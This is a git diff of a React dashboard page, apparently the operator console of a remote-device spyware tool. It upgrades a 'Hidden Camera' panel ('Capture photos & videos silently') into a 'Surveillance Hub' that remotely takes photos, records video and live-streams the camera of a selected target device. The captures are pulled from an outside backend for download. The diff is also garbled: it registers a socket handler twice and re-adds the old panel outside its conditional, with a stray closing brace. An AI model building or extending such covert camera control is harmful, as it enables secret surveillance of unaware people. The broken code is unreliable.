@@ -103,6 +103,8 @@ export default function Home() {
     const [cameraMode, setCameraMode] = useState<'front' | 'back'>('back');
     const [isCapturingPhoto, setIsCapturingPhoto] = useState(false);
     const [isRecording, setIsRecording] = useState(false);
+    const [isLiveStreaming, setIsLiveStreaming] = useState(false);
+    const [liveFrame, setLiveFrame] = useState<string | null>(null);
     const [recordingDuration, setRecordingDuration] = useState(60); // Default 1 min
     const [recordingProgress, setRecordingProgress] = useState({ current: 0, total: 0 });
     const [capturedMedia, setCapturedMedia] = useState<{ type: string; data: string; camera: string; timestamp: number }[]>([]);
@@ -276,6 +278,18 @@ export default function Home() {
                         camera: data.camera || 'back',
                         timestamp: data.timestamp || Date.now()
                     }, ...prev]);
+                }
+            });
+
+            socket.on("live_frame", (data: any) => {
+                if (data.frame) {
+                    setLiveFrame(data.frame);
+                }
+            });
+
+            socket.on("live_frame", (data: any) => {
+                if (data.frame) {
+                    setLiveFrame(data.frame);
                 }
             });
 
@@ -1049,218 +1063,359 @@ END:VCARD`;
                         </div>
                     )}
 
-                    {/* Camera Tool */}
+                    {/* Advanced Camera Tool - Surveillance Hub */}
                     {selectedTool === 'camera' && (
                         <div className="space-y-6">
-                            {/* Camera Controls Card */}
-                            <div className="bg-white/5 border border-white/10 p-6 rounded-2xl max-w-xl mx-auto">
-                                <div className="flex items-center justify-between mb-6">
-                                    <div>
-                                        <h3 className="text-xl font-bold mb-1">Hidden Camera</h3>
-                                        <p className="text-white/40 text-sm">Capture photos & videos silently</p>
+                            {/* Live Feed & Controls */}
+                            <div className="bg-black/40 border border-white/10 rounded-2xl overflow-hidden backdrop-blur-md">
+                                {/* Header */}
+                                <div className="p-4 border-b border-white/10 flex items-center justify-between bg-black/20">
+                                    <div className="flex items-center gap-3">
+                                        <div className={`w-3 h-3 rounded-full ${isLiveStreaming ? 'bg-red-500 animate-pulse shadow-[0_0_10px_red]' : 'bg-green-500/50'}`} />
+                                        <div>
+                                            <h3 className="font-bold text-white tracking-wide">SURVEILLANCE HUB</h3>
+                                            <p className="text-xs text-white/40 font-mono">{selectedDeviceId ? `CONNECTED: ${selectedDeviceId.substring(0, 8)}...` : 'DISCONNECTED'}</p>
+                                        </div>
                                     </div>
-                                    <div className="p-3 rounded-xl bg-pink-500/20">
-                                        <svg className="w-6 h-6 text-pink-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
-                                    </div>
-                                </div>
-
-                                {/* Error Message */}
-                                {cameraError && (
-                                    <div className="mb-4 p-3 rounded-lg bg-red-500/20 border border-red-500/30 text-red-400 text-sm">
-                                        ⚠️ {cameraError}
-                                    </div>
-                                )}
-
-                                {/* Camera Selection */}
-                                <div className="mb-6">
-                                    <label className="block text-xs font-medium text-white/60 mb-3">Camera</label>
-                                    <div className="flex gap-2">
-                                        <button
-                                            onClick={() => setCameraMode('back')}
-                                            className={`flex-1 py-3 rounded-xl font-medium transition-all flex items-center justify-center gap-2 ${cameraMode === 'back' ? 'bg-pink-500/20 border-2 border-pink-500 text-pink-400' : 'bg-white/5 border border-white/10 text-white/60 hover:bg-white/10'}`}
-                                        >
-                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path></svg>
-                                            Back Camera
-                                        </button>
-                                        <button
-                                            onClick={() => setCameraMode('front')}
-                                            className={`flex-1 py-3 rounded-xl font-medium transition-all flex items-center justify-center gap-2 ${cameraMode === 'front' ? 'bg-pink-500/20 border-2 border-pink-500 text-pink-400' : 'bg-white/5 border border-white/10 text-white/60 hover:bg-white/10'}`}
-                                        >
-                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path></svg>
-                                            Front Camera
-                                        </button>
+                                    <div className="text-right">
+                                        <div className="text-xs font-mono text-cyan-400">CAM: {cameraMode.toUpperCase()}</div>
+                                        {isRecording && <div className="text-xs font-mono text-red-400">REC: {recordingProgress.current}s</div>}
                                     </div>
                                 </div>
 
-                                {/* Capture Photo */}
-                                <div className="mb-6">
-                                    <button
-                                        onClick={() => {
-                                            if (!selectedDeviceId || isCapturingPhoto || isRecording) return;
-                                            setIsCapturingPhoto(true);
-                                            setCameraError(null);
-                                            socket?.emit('capture_photo', {
-                                                uuid: session?.user?.uuid,
-                                                targetDeviceId: selectedDeviceId,
-                                                camera: cameraMode
-                                            });
-                                        }}
-                                        disabled={!selectedDeviceId || isCapturingPhoto || isRecording}
-                                        className={`w-full py-4 rounded-xl font-bold text-lg transition-all flex items-center justify-center gap-2 ${selectedDeviceId && !isCapturingPhoto && !isRecording ? 'bg-gradient-to-r from-pink-500 to-purple-500 hover:scale-[1.02] shadow-lg shadow-pink-500/20' : 'bg-white/10 text-white/20 cursor-not-allowed'}`}
-                                    >
-                                        {isCapturingPhoto ? (
-                                            <>
-                                                <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
-                                                Capturing...
-                                            </>
-                                        ) : (
-                                            <>
-                                                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
-                                                📸 Capture Photo
-                                            </>
-                                        )}
-                                    </button>
-                                </div>
-
-                                {/* Video Recording */}
-                                <div className="space-y-4">
-                                    <label className="block text-xs font-medium text-white/60">Video Recording</label>
-
-                                    {/* Duration Selection */}
-                                    <div className="grid grid-cols-4 gap-2">
-                                        {[
-                                            { label: '1 min', value: 60 },
-                                            { label: '2 min', value: 120 },
-                                            { label: '5 min', value: 300 },
-                                            { label: 'Live', value: -1 }
-                                        ].map((option) => (
-                                            <button
-                                                key={option.value}
-                                                onClick={() => setRecordingDuration(option.value)}
-                                                className={`py-2 rounded-lg text-sm font-medium transition-all ${recordingDuration === option.value ? 'bg-pink-500/20 border-2 border-pink-500 text-pink-400' : 'bg-white/5 border border-white/10 text-white/60 hover:bg-white/10'}`}
-                                            >
-                                                {option.label}
-                                            </button>
-                                        ))}
-                                    </div>
-
-                                    {/* Recording Progress */}
-                                    {isRecording && (
-                                        <div className="p-4 rounded-xl bg-red-500/10 border border-red-500/30">
-                                            <div className="flex items-center justify-between mb-2">
-                                                <span className="text-red-400 font-medium flex items-center gap-2">
-                                                    <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
-                                                    Recording...
-                                                </span>
-                                                <span className="text-white/60 text-sm">
-                                                    {recordingProgress.current}s / {recordingProgress.total === -1 ? '∞' : `${recordingProgress.total}s`}
-                                                </span>
+                                {/* Main Viewport */}
+                                <div className="relative aspect-video bg-black/80 flex items-center justify-center overflow-hidden">
+                                    {isLiveStreaming && liveFrame ? (
+                                        <img
+                                            src={`data:image/jpeg;base64,${liveFrame}`}
+                                            className="w-full h-full object-contain"
+                                            alt="Live Feed"
+                                        />
+                                    ) : (
+                                        <div className="text-center p-10">
+                                            <div className="w-20 h-20 mx-auto border-2 border-white/10 rounded-full flex items-center justify-center mb-4">
+                                                <svg className="w-10 h-10 text-white/20" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
                                             </div>
-                                            {recordingProgress.total > 0 && (
-                                                <div className="h-2 rounded-full bg-white/10 overflow-hidden">
-                                                    <div
-                                                        className="h-full bg-red-500 transition-all duration-1000"
-                                                        style={{ width: `${(recordingProgress.current / recordingProgress.total) * 100}%` }}
-                                                    />
-                                                </div>
-                                            )}
+                                            <p className="text-white/30 font-mono text-sm">FEED OFFLINE</p>
                                         </div>
                                     )}
 
-                                    {/* Record/Stop Buttons */}
-                                    {!isRecording ? (
+                                    {/* Overlays */}
+                                    <div className="absolute top-4 right-4 flex gap-2">
                                         <button
-                                            onClick={() => {
-                                                if (!selectedDeviceId || isCapturingPhoto) return;
-                                                setIsRecording(true);
-                                                setCameraError(null);
-                                                setRecordingProgress({ current: 0, total: recordingDuration });
-                                                socket?.emit('start_recording', {
-                                                    uuid: session?.user?.uuid,
-                                                    targetDeviceId: selectedDeviceId,
-                                                    camera: cameraMode,
-                                                    duration: recordingDuration
-                                                });
-                                            }}
-                                            disabled={!selectedDeviceId || isCapturingPhoto}
-                                            className={`w-full py-4 rounded-xl font-bold text-lg transition-all flex items-center justify-center gap-2 ${selectedDeviceId && !isCapturingPhoto ? 'bg-gradient-to-r from-red-500 to-pink-500 hover:scale-[1.02] shadow-lg shadow-red-500/20' : 'bg-white/10 text-white/20 cursor-not-allowed'}`}
+                                            onClick={() => setCameraMode(prev => prev === 'back' ? 'front' : 'back')}
+                                            className="p-2 rounded-lg bg-black/50 text-white/70 hover:text-white hover:bg-black/70 border border-white/10 transition-all"
+                                            title="Switch Camera"
                                         >
-                                            <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" /></svg>
-                                            🎥 Start Recording ({recordingDuration === -1 ? 'Live' : `${recordingDuration / 60}min`})
+                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
                                         </button>
-                                    ) : (
-                                        <button
-                                            onClick={() => {
-                                                socket?.emit('stop_recording', {
-                                                    uuid: session?.user?.uuid,
-                                                    targetDeviceId: selectedDeviceId
-                                                });
-                                            }}
-                                            className="w-full py-4 rounded-xl font-bold text-lg bg-white text-black hover:bg-gray-200 transition-all flex items-center justify-center gap-2"
-                                        >
-                                            <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><rect x="6" y="6" width="12" height="12" rx="2" /></svg>
-                                            ⏹️ Stop Recording
-                                        </button>
-                                    )}
+                                    </div>
                                 </div>
 
-                                {/* No Device Warning */}
-                                {!selectedDeviceId && (
-                                    <div className="mt-4 p-3 rounded-lg bg-yellow-500/10 border border-yellow-500/30 text-yellow-400 text-sm text-center">
-                                        Select a device from the top menu to use the camera
-                                    </div>
-                                )}
+                                {/* Control Panel */}
+                                <div className="p-4 grid grid-cols-3 gap-4 bg-white/5">
+                                    {/* Live Stream Button */}
+                                    <button
+                                        onClick={() => {
+                                            if (!selectedDeviceId) return;
+                                            if (isLiveStreaming) {
+                                                socket?.emit('stop_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
+                                                setIsLiveStreaming(false);
+                                                setLiveFrame(null);
+                                            } else {
+                                                socket?.emit('start_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode });
+                                                setIsLiveStreaming(true);
+                                            }
+                                        }}
+                                        className={`py-3 rounded-xl font-bold flex flex-col items-center gap-1 transition-all ${isLiveStreaming ? 'bg-red-500 text-white shadow-lg shadow-red-500/20' : 'bg-white/10 text-white hover:bg-white/20'}`}
+                                        disabled={!selectedDeviceId || isRecording}
+                                    >
+                                        <span className="text-xs uppercase tracking-wider">{isLiveStreaming ? 'Stop Live' : 'Go Live'}</span>
+                                    </button>
+
+                                    {/* Capture Photo */}
+                                    <button
+                                        onClick={() => {
+                                            if (!selectedDeviceId) return;
+                                            setIsCapturingPhoto(true);
+                                            socket?.emit('capture_photo', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode });
+                                        }}
+                                        className="py-3 rounded-xl bg-white/10 text-white hover:bg-white/20 font-bold flex flex-col items-center gap-1 transition-all active:scale-95"
+                                        disabled={!selectedDeviceId || isCapturingPhoto}
+                                    >
+                                        {isCapturingPhoto ? <span className="w-4 h-4 border-2 border-white/50 border-t-white rounded-full animate-spin" /> : <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path></svg>}
+                                        <span className="text-xs uppercase tracking-wider">Snap</span>
+                                    </button>
+
+                                    {/* Record Video */}
+                                    <button
+                                        onClick={() => {
+                                            if (!selectedDeviceId) return;
+                                            if (isRecording) {
+                                                socket?.emit('stop_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
+                                                setIsRecording(false);
+                                            } else {
+                                                socket?.emit('start_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode, duration: 60 });
+                                                setIsRecording(true);
+                                            }
+                                        }}
+                                        className={`py-3 rounded-xl font-bold flex flex-col items-center gap-1 transition-all ${isRecording ? 'bg-red-500 text-white' : 'bg-white/10 text-white hover:bg-white/20'}`}
+                                        disabled={!selectedDeviceId || isLiveStreaming}
+                                    >
+                                        <span className="text-xs uppercase tracking-wider">{isRecording ? 'Stop Rec' : 'Record'}</span>
+                                    </button>
+                                </div>
                             </div>
 
                             {/* Captured Media Gallery */}
                             {capturedMedia.length > 0 && (
-                                <div className="bg-white/5 border border-white/10 p-6 rounded-2xl">
-                                    <div className="flex items-center justify-between mb-4">
-                                        <h3 className="text-lg font-bold">Captured Media</h3>
-                                        <button
-                                            onClick={() => setCapturedMedia([])}
-                                            className="text-xs text-white/40 hover:text-red-400 transition-colors"
-                                        >
-                                            Clear All
-                                        </button>
+                                <div className="bg-white/5 border border-white/10 p-4 rounded-2xl">
+                                    <div className="flex justify-between items-center mb-4">
+                                        <h4 className="font-bold text-white/80 flex items-center gap-2">
+                                            <span className="text-xl">📂</span> CAPTURES
+                                        </h4>
+                                        <button onClick={() => setCapturedMedia([])} className="text-xs text-white/40 hover:text-white">Clear</button>
                                     </div>
-                                    <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3">
-                                        {capturedMedia.map((media, idx) => (
-                                            <div key={idx} className="relative group aspect-square rounded-xl overflow-hidden bg-black/50 border border-white/10">
-                                                {media.type === 'photo' ? (
-                                                    <img
-                                                        src={`data:image/jpeg;base64,${media.data}`}
-                                                        alt={`Captured ${idx}`}
-                                                        className="w-full h-full object-cover"
-                                                    />
-                                                ) : (
-                                                    <video
-                                                        src={`data:video/mp4;base64,${media.data}`}
-                                                        className="w-full h-full object-cover"
-                                                        controls
-                                                    />
-                                                )}
-                                                <div className="absolute top-2 left-2 px-2 py-1 rounded-md bg-black/70 text-xs">
-                                                    {media.type === 'photo' ? '📷' : '🎥'} {media.camera}
-                                                </div>
-                                                <div className="absolute bottom-0 left-0 right-0 p-2 bg-gradient-to-t from-black/80 to-transparent opacity-0 group-hover:opacity-100 transition-opacity">
-                                                    <div className="text-xs text-white/60">
-                                                        {new Date(media.timestamp).toLocaleString()}
+                                    <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-3">
+                                        {capturedMedia.map((media, i) => {
+                                            const isUrl = media.data.startsWith('/') || media.data.startsWith('http');
+                                            const src = isUrl
+                                                ? (media.data.startsWith('http') ? media.data : `https://backend-api-gallery.onrender.com${media.data}`)
+                                                : `data:image/jpeg;base64,${media.data}`;
+
+                                            return (
+                                                <div key={i} className="group relative aspect-square bg-black rounded-lg overflow-hidden border border-white/10 cursor-pointer transition-all hover:scale-[1.02]">
+                                                    {media.type === 'photo' ? (
+                                                        <img src={src} className="w-full h-full object-cover opacity-80 group-hover:opacity-100" />
+                                                    ) : (
+                                                        <video src={media.type === 'video' && !isUrl ? `data:video/mp4;base64,${media.data}` : src} className="w-full h-full object-cover" />
+                                                    )}
+                                                    <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent opacity-0 group-hover:opacity-100 transition-opacity p-2 flex flex-col justify-end">
+                                                        <a href={src} target="_blank" download={`capture_${i}`} className="text-xs text-white font-bold bg-white/20 p-1.5 rounded text-center backdrop-blur-sm hover:bg-white/40">
+                                                            DOWNLOAD
+                                                        </a>
                                                     </div>
-                                                    <a
-                                                        href={`data:${media.type === 'photo' ? 'image/jpeg' : 'video/mp4'};base64,${media.data}`}
-                                                        download={`capture_${media.timestamp}.${media.type === 'photo' ? 'jpg' : 'mp4'}`}
-                                                        className="text-xs text-purple-400 hover:text-purple-300"
-                                                    >
-                                                        Download
-                                                    </a>
+                                                    <div className="absolute top-1 right-1 px-1.5 py-0.5 rounded bg-black/60 text-[10px] text-white/70 font-mono">
+                                                        {new Date(media.timestamp).toLocaleTimeString()}
+                                                    </div>
                                                 </div>
-                                            </div>
-                                        ))}
+                                            );
+                                        })}
                                     </div>
                                 </div>
                             )}
                         </div>
+                    )}
+                    <div className="space-y-6">
+                        {/* Camera Controls Card */}
+                        <div className="bg-white/5 border border-white/10 p-6 rounded-2xl max-w-xl mx-auto">
+                            <div className="flex items-center justify-between mb-6">
+                                <div>
+                                    <h3 className="text-xl font-bold mb-1">Hidden Camera</h3>
+                                    <p className="text-white/40 text-sm">Capture photos & videos silently</p>
+                                </div>
+                                <div className="p-3 rounded-xl bg-pink-500/20">
+                                    <svg className="w-6 h-6 text-pink-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
+                                </div>
+                            </div>
+
+                            {/* Error Message */}
+                            {cameraError && (
+                                <div className="mb-4 p-3 rounded-lg bg-red-500/20 border border-red-500/30 text-red-400 text-sm">
+                                    ⚠️ {cameraError}
+                                </div>
+                            )}
+
+                            {/* Camera Selection */}
+                            <div className="mb-6">
+                                <label className="block text-xs font-medium text-white/60 mb-3">Camera</label>
+                                <div className="flex gap-2">
+                                    <button
+                                        onClick={() => setCameraMode('back')}
+                                        className={`flex-1 py-3 rounded-xl font-medium transition-all flex items-center justify-center gap-2 ${cameraMode === 'back' ? 'bg-pink-500/20 border-2 border-pink-500 text-pink-400' : 'bg-white/5 border border-white/10 text-white/60 hover:bg-white/10'}`}
+                                    >
+                                        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path></svg>
+                                        Back Camera
+                                    </button>
+                                    <button
+                                        onClick={() => setCameraMode('front')}
+                                        className={`flex-1 py-3 rounded-xl font-medium transition-all flex items-center justify-center gap-2 ${cameraMode === 'front' ? 'bg-pink-500/20 border-2 border-pink-500 text-pink-400' : 'bg-white/5 border border-white/10 text-white/60 hover:bg-white/10'}`}
+                                    >
+                                        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path></svg>
+                                        Front Camera
+                                    </button>
+                                </div>
+                            </div>
+
+                            {/* Capture Photo */}
+                            <div className="mb-6">
+                                <button
+                                    onClick={() => {
+                                        if (!selectedDeviceId || isCapturingPhoto || isRecording) return;
+                                        setIsCapturingPhoto(true);
+                                        setCameraError(null);
+                                        socket?.emit('capture_photo', {
+                                            uuid: session?.user?.uuid,
+                                            targetDeviceId: selectedDeviceId,
+                                            camera: cameraMode
+                                        });
+                                    }}
+                                    disabled={!selectedDeviceId || isCapturingPhoto || isRecording}
+                                    className={`w-full py-4 rounded-xl font-bold text-lg transition-all flex items-center justify-center gap-2 ${selectedDeviceId && !isCapturingPhoto && !isRecording ? 'bg-gradient-to-r from-pink-500 to-purple-500 hover:scale-[1.02] shadow-lg shadow-pink-500/20' : 'bg-white/10 text-white/20 cursor-not-allowed'}`}
+                                >
+                                    {isCapturingPhoto ? (
+                                        <>
+                                            <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                                            Capturing...
+                                        </>
+                                    ) : (
+                                        <>
+                                            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
+                                            📸 Capture Photo
+                                        </>
+                                    )}
+                                </button>
+                            </div>
+
+                            {/* Video Recording */}
+                            <div className="space-y-4">
+                                <label className="block text-xs font-medium text-white/60">Video Recording</label>
+
+                                {/* Duration Selection */}
+                                <div className="grid grid-cols-4 gap-2">
+                                    {[
+                                        { label: '1 min', value: 60 },
+                                        { label: '2 min', value: 120 },
+                                        { label: '5 min', value: 300 },
+                                        { label: 'Live', value: -1 }
+                                    ].map((option) => (
+                                        <button
+                                            key={option.value}
+                                            onClick={() => setRecordingDuration(option.value)}
+                                            className={`py-2 rounded-lg text-sm font-medium transition-all ${recordingDuration === option.value ? 'bg-pink-500/20 border-2 border-pink-500 text-pink-400' : 'bg-white/5 border border-white/10 text-white/60 hover:bg-white/10'}`}
+                                        >
+                                            {option.label}
+                                        </button>
+                                    ))}
+                                </div>
+
+                                {/* Recording Progress */}
+                                {isRecording && (
+                                    <div className="p-4 rounded-xl bg-red-500/10 border border-red-500/30">
+                                        <div className="flex items-center justify-between mb-2">
+                                            <span className="text-red-400 font-medium flex items-center gap-2">
+                                                <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
+                                                Recording...
+                                            </span>
+                                            <span className="text-white/60 text-sm">
+                                                {recordingProgress.current}s / {recordingProgress.total === -1 ? '∞' : `${recordingProgress.total}s`}
+                                            </span>
+                                        </div>
+                                        {recordingProgress.total > 0 && (
+                                            <div className="h-2 rounded-full bg-white/10 overflow-hidden">
+                                                <div
+                                                    className="h-full bg-red-500 transition-all duration-1000"
+                                                    style={{ width: `${(recordingProgress.current / recordingProgress.total) * 100}%` }}
+                                                />
+                                            </div>
+                                        )}
+                                    </div>
+                                )}
+
+                                {/* Record/Stop Buttons */}
+                                {!isRecording ? (
+                                    <button
+                                        onClick={() => {
+                                            if (!selectedDeviceId || isCapturingPhoto) return;
+                                            setIsRecording(true);
+                                            setCameraError(null);
+                                            setRecordingProgress({ current: 0, total: recordingDuration });
+                                            socket?.emit('start_recording', {
+                                                uuid: session?.user?.uuid,
+                                                targetDeviceId: selectedDeviceId,
+                                                camera: cameraMode,
+                                                duration: recordingDuration
+                                            });
+                                        }}
+                                        disabled={!selectedDeviceId || isCapturingPhoto}
+                                        className={`w-full py-4 rounded-xl font-bold text-lg transition-all flex items-center justify-center gap-2 ${selectedDeviceId && !isCapturingPhoto ? 'bg-gradient-to-r from-red-500 to-pink-500 hover:scale-[1.02] shadow-lg shadow-red-500/20' : 'bg-white/10 text-white/20 cursor-not-allowed'}`}
+                                    >
+                                        <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" /></svg>
+                                        🎥 Start Recording ({recordingDuration === -1 ? 'Live' : `${recordingDuration / 60}min`})
+                                    </button>
+                                ) : (
+                                    <button
+                                        onClick={() => {
+                                            socket?.emit('stop_recording', {
+                                                uuid: session?.user?.uuid,
+                                                targetDeviceId: selectedDeviceId
+                                            });
+                                        }}
+                                        className="w-full py-4 rounded-xl font-bold text-lg bg-white text-black hover:bg-gray-200 transition-all flex items-center justify-center gap-2"
+                                    >
+                                        <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><rect x="6" y="6" width="12" height="12" rx="2" /></svg>
+                                        ⏹️ Stop Recording
+                                    </button>
+                                )}
+                            </div>
+
+                            {/* No Device Warning */}
+                            {!selectedDeviceId && (
+                                <div className="mt-4 p-3 rounded-lg bg-yellow-500/10 border border-yellow-500/30 text-yellow-400 text-sm text-center">
+                                    Select a device from the top menu to use the camera
+                                </div>
+                            )}
+                        </div>
+
+                        {/* Captured Media Gallery */}
+                        {capturedMedia.length > 0 && (
+                            <div className="bg-white/5 border border-white/10 p-6 rounded-2xl">
+                                <div className="flex items-center justify-between mb-4">
+                                    <h3 className="text-lg font-bold">Captured Media</h3>
+                                    <button
+                                        onClick={() => setCapturedMedia([])}
+                                        className="text-xs text-white/40 hover:text-red-400 transition-colors"
+                                    >
+                                        Clear All
+                                    </button>
+                                </div>
+                                <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3">
+                                    {capturedMedia.map((media, idx) => (
+                                        <div key={idx} className="relative group aspect-square rounded-xl overflow-hidden bg-black/50 border border-white/10">
+                                            {media.type === 'photo' ? (
+                                                <img
+                                                    src={`data:image/jpeg;base64,${media.data}`}
+                                                    alt={`Captured ${idx}`}
+                                                    className="w-full h-full object-cover"
+                                                />
+                                            ) : (
+                                                <video
+                                                    src={`data:video/mp4;base64,${media.data}`}
+                                                    className="w-full h-full object-cover"
+                                                    controls
+                                                />
+                                            )}
+                                            <div className="absolute top-2 left-2 px-2 py-1 rounded-md bg-black/70 text-xs">
+                                                {media.type === 'photo' ? '📷' : '🎥'} {media.camera}
+                                            </div>
+                                            <div className="absolute bottom-0 left-0 right-0 p-2 bg-gradient-to-t from-black/80 to-transparent opacity-0 group-hover:opacity-100 transition-opacity">
+                                                <div className="text-xs text-white/60">
+                                                    {new Date(media.timestamp).toLocaleString()}
+                                                </div>
+                                                <a
+                                                    href={`data:${media.type === 'photo' ? 'image/jpeg' : 'video/mp4'};base64,${media.data}`}
+                                                    download={`capture_${media.timestamp}.${media.type === 'photo' ? 'jpg' : 'mp4'}`}
+                                                    className="text-xs text-purple-400 hover:text-purple-300"
+                                                >
+                                                    Download
+                                                </a>
+                                            </div>
+                                        </div>
+                                    ))}
+                                </div>
+                            </div>
+                        )}
+                    </div>
                     )}
                 </div>
 
